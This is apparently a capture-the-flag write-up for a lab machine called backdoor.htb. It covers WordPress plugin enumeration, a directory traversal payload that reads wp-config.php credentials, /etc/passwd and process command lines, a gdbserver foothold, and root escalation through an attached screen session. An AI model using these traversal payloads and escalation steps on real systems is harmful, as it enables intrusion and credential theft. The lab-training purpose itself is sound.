1, nmap scan services and versions:
22/tcp ssh
80/tcp http
1337/tcp open  waste

2, enumerate the web contents and possible services
*powered by wordpress 5.8.1 (enumerate the Fragile plugins)
wp-admin - redirect to wp-login

try to use sql injection to login into admin(fail)

wpscan -e ap,t,tt,u --url http://backdoor.htb --api-token $WPSCAN_API

wpscan -e ap --plugins-detection aggressive --url http://backdoor.htb --api-token $WPSCAN_API

then we find :
ebook-download
 | Location: http://backdoor.htb/wp-content/plugins/ebook-download/
Title: Ebook Download < 1.2 - Directory Traversal
(https://www.exploit-db.com/exploits/39575)

Let's try to find something funny!!!

Poc: /wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php

then we can get the configurations , that is so cool
'DB_USER', 'wordpressuser'
'DB_PASSWORD', 'MQYBJSaD#DxG6qbm'
try to use this credit to ssh connect(not so lucky, so we have to check contine)

http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../etc/passwd

we can get /ect/passwd:
user:x:1000:1000:user:/home/user:/bin/bash

Apache configs is something I can try to grab. /etc/apache2/sites-enabled/000-default.conf doesn’t returns anything, but backdoor.htb.conf

also nothing useful

3, come back to the wired 1337 port

In each numbered folder, the cmdline file has the command line user to run the process:

cat /proc/self/cmdline | xxd
00000000: 6361 7400 2f70 726f 632f 7365 6c66 2f63  cat./proc/self/c
00000010: 6d64 6c69 6e65 00                        mdline.

So let's try it into the machine

curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/self/cmdline -o- | xxd

curl -s http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/self/cmdline | tr '\000' ' ' | cut -c115- | rev | cut -c32- | rev


try to enumerate the cmdline of each pid, then we can find 851 pid take the host 0.0.0.0:1337 and open service - gdbserver 

851: /bin/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done

then we can search gdbserver exploits on hacktricks:
https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver

finally we get the shell to this machine

4,Privilege Escalation

Let's list all of the running processes on the system using ps .
ps aux
then we can find that run with root right
/bin/sh -c while true;
    do sleep 1;
    find /var/run/screen/S-root/ -empty -exec screen -dmS root \;
done

Running screen -ls will show sessions for the current user:
No Sockets found in /run/screen/S-user.

screen -ls root/

There is a suitable screen on:
        947.root        (04/20/22 16:43:20)     (Multi, detached)
1 Socket in /run/screen/S-root.

connect to that session using -x and the [user]/[session id]

export TERM=screen
screen -x root/root

finally we can get the root shell !!!

